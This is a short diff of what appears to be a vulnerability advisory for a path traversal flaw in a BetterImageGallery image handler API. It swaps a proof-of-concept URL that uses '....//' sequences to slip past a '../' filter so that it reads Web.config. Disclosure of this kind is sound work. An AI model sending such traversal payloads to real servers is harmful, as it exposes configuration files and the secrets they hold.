@@ -20,7 +20,7 @@ However, attackers can bypass this protection by doubling the "../" sequence lik
 ## Proof of Concept
 
 Below is a simple PoC:
-http://127.0.0.1/api/BetterImageGallery/imagehandler?path=....//....//sqlitedb/initdb.config
+http://127.0.0.1/api/BetterImageGallery/imagehandler?path=....//....//....//Web.config
 
 ![](attachments/poc.jpg)
 
